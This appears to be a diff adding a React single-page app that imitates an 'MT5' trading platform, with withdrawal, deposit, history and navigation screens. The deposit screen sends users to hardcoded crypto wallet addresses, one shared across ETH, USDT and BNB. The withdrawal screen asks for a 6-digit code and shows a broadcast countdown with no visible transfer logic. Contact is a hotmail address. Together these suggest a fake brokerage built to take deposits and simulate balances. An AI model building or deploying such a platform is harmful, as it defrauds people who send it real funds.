+                                </div>
+                                <p className="text-xs text-gray-400">Time remaining until transaction is broadcasted to blockchain.</p>
+                                <div className="mt-6 text-left space-y-2 text-sm">
+                                    <div className="flex justify-between"><span className="text-gray-500">Amount:</span> <span>${state.withdrawalProcessing.amount}</span></div>
+                                    <div className="flex justify-between"><span className="text-gray-500">Network:</span> <span>{state.withdrawalProcessing.network}</span></div>
+                                    <div className="break-all text-[10px] text-gray-600 mt-2">{state.withdrawalProcessing.address}</div>
+                                </div>
+                            </div>
+                        </div>
+                    );
+                }
+
+                if (step === 'main') {
+                    return (
+                        <div className="p-6 space-y-4">
+                            <h2 className="text-xl font-bold mb-4">Withdraw</h2>
+                            <button onClick={() => setStep('details')} className="w-full flex items-center justify-between p-4 bg-slate-900 rounded border border-slate-800">
+                                <span>On-Chain Transfer</span>
+                                <Icons.Plus />
+                            </button>
+                            <button className="w-full flex items-center justify-between p-4 bg-slate-900 rounded border border-slate-800 opacity-50">
+                                <span>Internal Transfer (MT ID)</span>
+                                <Icons.Plus />
+                            </button>
+                        </div>
+                    );
+                }
+
+                return (
+                    <div className="p-6 space-y-6 overflow-y-auto">
+                        <h2 className="text-xl font-bold">Withdraw Details</h2>
+                        <div className="space-y-4">
+                            <div className="flex flex-col gap-2">
+                                <label className="text-[10px] uppercase font-bold text-gray-500">Address</label>
+                                <input value={details.address} onChange={e => setDetails({...details, address: e.target.value})} placeholder="Enter Address" />
+                            </div>
+                            <div className="flex flex-col gap-2">
+                                <label className="text-[10px] uppercase font-bold text-gray-500">Network</label>
+                                <select value={details.network} onChange={e => setDetails({...details, network: e.target.value})}>
+                                    <option>Ethereum (ERC20)</option>
+                                    <option>Bitcoin</option>
+                                    <option>BNB Smart Chain (BEP20)</option>
+                                    <option>Tron (TRC20)</option>
+                                </select>
+                            </div>
+                            <div className="flex flex-col gap-2">
+                                <label className="text-[10px] uppercase font-bold text-gray-500">Amount</label>
+                                <div className="relative">
+                                    <input className="w-full pr-12" value={details.amount} onChange={e => setDetails({...details, amount: e.target.value})} placeholder="0.00" />
+                                    <button onClick={() => setDetails({...details, amount: state.user.balance})} className="absolute right-3 top-2 text-[10px] text-blue-400 font-bold">MAX</button>
+                                </div>
+                                <span className="text-[10px] text-gray-500">Fee: 0.114 BNB / Gas included</span>
+                            </div>
+                            <div className="bg-yellow-500/10 border border-yellow-500/20 p-3 rounded text-[10px] text-yellow-500">
+                                Enter 6-digit Validation Code from your Secure Mail or Authenticator to proceed.
+                            </div>
+                            <input className="w-full text-center tracking-[1em] text-lg font-bold" value={code} onChange={e => setCode(e.target.value)} maxLength={6} placeholder="000000" />
+                            <button onClick={submitWithdraw} className="w-full bg-blue-600 py-4 font-bold rounded">CONFIRM WITHDRAWAL</button>
+                        </div>
+                    </div>
+                );
+            };
+
+            const DepositView = () => {
+                const [step, setStep] = useState('list'); // list, qr
+                const [selected, setSelected] = useState(null);
+                const qrRef = useRef(null);
+
+                const addresses = {
+                    'BTC': 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu',
+                    'ETH': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+                    'USDT': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+                    'BNB': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130'
+                };
+
+                useEffect(() => {
+                    if (step === 'qr' && qrRef.current) {
+                        qrRef.current.innerHTML = '';
+                        new QRCode(qrRef.current, {
+                            text: addresses[selected.symbol] || addresses['ETH'],
+                            width: 180,
+                            height: 180,
+                            colorDark: "#ffffff",
+                            colorLight: "#0f172a"
+                        });
+                    }
+                }, [step]);
+
+                if (step === 'list') {
+                    return (
+                        <div className="p-4 space-y-4">
+                            <h2 className="text-xl font-bold">Deposit Assets</h2>
+                            <div className="space-y-2">
+                                {state.quotes.slice(0, 10).map(coin => (
+                                    <button 
+                                        key={coin.id} 
+                                        onClick={() => { setSelected(coin); setStep('qr'); }}
+                                        className="w-full flex items-center justify-between p-4 bg-slate-900 rounded border border-slate-800"
+                                    >
+                                        <div className="flex items-center gap-3">
+                                            <img src={coin.image} className="w-6 h-6" alt="" />
+                                            <span className="font-bold">{coin.symbol}</span>
+                                        </div>
+                                        <Icons.Plus />
+                                    </button>
+                                ))}
+                            </div>
+                        </div>
+                    );
+                }
+
+                return (
+                    <div className="p-6 text-center space-y-6">
+                        <button onClick={() => setStep('list')} className="text-blue-400 text-sm">Back to Assets</button>
+                        <h2 className="text-xl font-bold">Deposit {selected.symbol}</h2>
+                        <div className="flex justify-center bg-white p-4 rounded-xl mx-auto w-fit">
+                            <div ref={qrRef}></div>
+                        </div>
+                        <div className="bg-slate-900 p-4 rounded border border-slate-800 break-all text-xs font-mono">
+                            {addresses[selected.symbol] || addresses['ETH']}
+                        </div>
+                        <button 
+                            onClick={() => {
+                                navigator.clipboard.writeText(addresses[selected.symbol] || addresses['ETH']);
+                                setNotification({ title: "Copied", body: "Address copied to clipboard." });
+                            }} 
+                            className="bg-slate-800 px-6 py-2 rounded font-bold"
+                        >
+                            COPY ADDRESS
+                        </button>
+                        <p className="text-[10px] text-gray-500 uppercase">Send only {selected.symbol} to this address. Min deposit 0.001</p>
+                    </div>
+                );
+            };
+
+            const HistoryPage = () => (
+                <div className="p-4 h-screen overflow-y-auto pb-24">
+                    <h2 className="text-xl font-bold mb-4">Account History</h2>
+                    {state.activities.length === 0 ? (
+                        <div className="text-center py-20 text-gray-600 uppercase text-xs font-bold tracking-widest">No recent activity</div>
+                    ) : (
+                        <div className="space-y-3">
+                            {state.activities.map(act => (
+                                <div key={act.id} className="p-4 bg-slate-900 border border-slate-800 rounded">
+                                    <div className="flex justify-between items-center mb-1">
+                                        <span className={`text-[10px] font-bold px-1 rounded ${act.type.includes('BUY') ? 'bg-green-500/10 text-green-500' : 'bg-red-500/10 text-red-500'}`}>
+                                            {act.type}
+                                        </span>
+                                        <span className="text-[10px] text-gray-500">{act.date}</span>
+                                    </div>
+                                    <div className="flex justify-between items-end">
+                                        <div className="text-sm font-bold">{act.symbol || 'Withdrawal'}</div>
+                                        <div className={`mono font-bold ${act.amount >= 0 ? 'text-green-500' : 'text-red-500'}`}>
+                                            {act.amount >= 0 ? '+' : ''}{act.amount.toFixed(2)}
+                                        </div>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    )}
+                </div>
+            );
+
+            // --- LAYOUT COMPONENTS ---
+
+            const GlobalHeader = () => (
+                <div className="h-[48px] bg-[#0b1220] mt-border-b flex items-center justify-between px-3 fixed top-0 w-full z-50">
+                    <button onClick={() => setModal({ title: "Navigation", body: "Full MT5 menu options will appear here." })} className="text-white">
+                        <Icons.Menu />
+                    </button>
+                    <div className="flex-1 flex justify-center gap-4">
+                        <button onClick={() => navigate('quotes')} className="text-[10px] font-bold text-gray-400 uppercase">Quotes</button>
+                        <button onClick={() => navigate('chart')} className="text-[10px] font-bold text-blue-400 uppercase border-b border-blue-400">Chart</button>
+                        <button onClick={() => navigate('trade')} className="text-[10px] font-bold text-gray-400 uppercase">Trade</button>
+                    </div>
+                    <div className="flex items-center gap-3">
+                        <a href="mailto:mt5-base@hotmail.com"><Icons.Mail /></a>
+                        <button onClick={() => navigate('settings')}><Icons.Settings /></button>
+                    </div>
+                </div>
+            );
+
+            const BottomNav = () => (
+                <div className="h-[64px] bg-[#0f1729] mt-border-t fixed bottom-0 w-full z-50 flex items-center justify-around px-2">
+                    <button onClick={() => navigate('quotes')} className={`mt-nav-item ${state.activePage === 'quotes' ? 'active' : ''}`}>
+                        <Icons.Quotes />
+                        <span>Quotes</span>
+                    </button>
+                    <button onClick={() => navigate('chart')} className={`mt-nav-item ${state.activePage === 'chart' ? 'active' : ''}`}>
+                        <Icons.Chart />
+                        <span>Charts</span>
+                    </button>
+                    <button onClick={() => navigate('trade')} className={`mt-nav-item ${state.activePage === 'trade' ? 'active' : ''}`}>
+                        <Icons.Trade />
+                        <span>Trade</span>
+                    </button>
+                    <button onClick={() => navigate('history')} className={`mt-nav-item ${state.activePage === 'history' ? 'active' : ''}`}>
+                        <Icons.History />
+                        <span>History</span>
+                    </button>
+                    <button onClick={() => navigate('dashboard')} className={`mt-nav-item ${state.activePage === 'dashboard' ? 'active' : ''}`}>
+                        <Icons.Settings />
+                        <span>Profile</span>
+                    </button>
+                </div>
+            );
+
+            const LoadingOverlay = () => (
+                <div className="fixed inset-0 z-[100] bg-black/90 flex flex-col items-center justify-center p-10">
+                    <div className="w-full max-w-xs space-y-4 text-center">
+                        <h3 className="text-blue-400 font-bold uppercase tracking-widest text-sm">{loadingMsg}</h3>
+                        <div className="h-1 bg-slate-800 w-full rounded-full overflow-hidden">
+                            <div className="loader-bar"></div>
+                        </div>
+                        <p className="text-[10px] text-gray-500">Connecting to secure trading node...</p>
+                    </div>
+                </div>
+            );
+
+            const NotificationPopup = () => (
+                <div className="fixed top-2 left-2 right-2 z-[110] bg-blue-600 p-4 rounded-lg shadow-2xl flex items-center gap-4 animate-slide-down">
+                    <div className="bg-white/20 p-2 rounded-full">
+                        <Icons.Mail />
+                    </div>
+                    <div className="flex-1">
+                        <div className="text-xs font-bold uppercase mb-0.5">{notification.title}</div>
+                        <div className="text-xs text-blue-100">{notification.body}</div>
+                    </div>
+                    <button onClick={() => setNotification(null)} className="text-white/50">×</button>
+                </div>
+            );
+
+            const SaveAccountPopup = () => (
+                <div className="fixed inset-0 z-[120] bg-black/80 flex items-center justify-center p-6">
+                    <div className="bg-[#1e293b] w-full max-w-sm rounded-lg border border-blue-500 p-6 space-y-4">
+                        <div className="text-center">
+                            <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
+                                <Icons.Plus />
+                            </div>
+                            <h2 className="text-xl font-bold">Registration Successful!</h2>
+                            <p className="text-sm text-gray-400 mt-2">Your account has been generated. Please save your login details.</p>
+                        </div>
+                        <div className="bg-slate-900 p-4 rounded space-y-2 border border-slate-800">
+                            <div className="text-[10px] text-gray-500 uppercase">Account ID</div>
+                            <div className="font-mono text-lg">{state.user.accountId}</div>
+                            <div className="text-[10px] text-gray-500 uppercase mt-2">Email</div>
+                            <div className="text-sm">{state.user.email}</div>
+                        </div>
+                        <button onClick={() => setShowSavePopup(false)} className="w-full bg-blue-600 py-3 font-bold rounded">SAVE & CONTINUE</button>
+                    </div>
+                </div>
+            );
+
+            // App Router
+            const renderView = () => {
+                if (!state.isLoggedIn) {
+                    if (state.activePage === 'register') return <RegisterPage />;
+                    if (state.activePage === 'login') return <LoginPage />;
+                    return <LandingPage />;
+                }
+
+                switch (state.activePage) {
+                    case 'dashboard': return <Dashboard />;
+                    case 'quotes': return <QuotesPage />;
+                    case 'chart': return <ChartsPage />;
+                    case 'trade': return <TradePage />;
+                    case 'history': return <HistoryPage />;
+                    case 'order': return <OrderTicket />;
+                    case 'withdraw': return <WithdrawalFlow />;
+                    case 'deposit': return <DepositView />;
+                    case 'settings': return (
+                        <div className="p-6 space-y-6">
+                            <h2 className="text-xl font-bold">Settings</h2>
+                            <div className="space-y-2">
+                                <div className="flex items-center justify-between p-4 bg-slate-900 rounded border border-slate-800">
+                                    <span>Notifications</span>
+                                    <input type="checkbox" checked={state.notificationsEnabled} onChange={() => setState(prev => ({ ...prev, notificationsEnabled: !prev.notificationsEnabled }))} />
+                                </div>
+                                <div className="flex items-center justify-between p-4 bg-slate-900 rounded border border-slate-800">
+                                    <span>Currency</span>
+                                    <span className="text-blue-400 font-bold">USD</span>
+                                </div>
+                                <button onClick={() => { localStorage.clear(); window.location.reload(); }} className="w-full p-4 bg-red-500/10 text-red-500 border border-red-500/20 rounded font-bold mt-8">LOGOUT ACCOUNT</button>
+                            </div>
+                        </div>
+                    );
+                    default: return <Dashboard />;
+                }
+            };
+
+            return (
+                <div className="flex flex-col h-screen overflow-hidden">
+                    {state.isLoggedIn && <GlobalHeader />}
+                    <main className={`flex-1 overflow-hidden ${state.isLoggedIn ? 'pt-[48px]' : ''}`}>
+                        {renderView()}
+                    </main>
+                    {state.isLoggedIn && <BottomNav />}
+                    
+                    {/* Overlays */}
+                    {isLoading && <LoadingOverlay />}
+                    {notification && <NotificationPopup />}
+                    {showSavePopup && <SaveAccountPopup />}
+                    {modal && (
+                        <div className="fixed inset-0 z-[200] bg-black/80 flex items-center justify-center p-6">
+                            <div className="bg-[#1e293b] w-full max-w-sm rounded-lg border border-slate-800 p-6">
+                                <h3 className="text-lg font-bold mb-2">{modal.title}</h3>
+                                <p className="text-sm text-gray-400 mb-6">{modal.body}</p>
+                                <button onClick={() => setModal(null)} className="w-full bg-slate-700 py-3 rounded font-bold">CLOSE</button>
+                            </div>
+                        </div>
+                    )}
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
